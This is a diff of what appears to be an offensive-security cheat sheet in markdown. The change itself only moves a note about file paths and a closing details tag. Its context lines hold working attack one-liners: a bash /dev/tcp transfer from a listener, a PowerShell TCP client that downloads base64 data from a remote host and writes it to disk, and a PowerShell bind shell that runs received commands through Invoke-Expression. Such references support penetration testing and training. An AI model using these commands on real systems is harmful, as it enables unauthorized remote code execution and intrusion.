@@ -412,12 +412,12 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close()}
 ```
 
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+</details>
+
 ***
 
 ```
 & {$LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTCPClient(); $NetworkStream = $TCPClient.GetStream(); $StreamReader = [System.IO.StreamReader]::new($NetworkStream); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while (($RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {$Code = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); try {$Output = Invoke-Expression $Code 2>&1 | Out-String;} catch {$Output = $_.Exception.Message}; $Prompt = "PS $($PWD.Path)> "; $FullOutput = $Output + "`r`n" + $Prompt; $StreamWriter.Write($FullOutput); $Code = $null}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close(); $Listener.Stop()}
 ```
-
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
-
-</details>
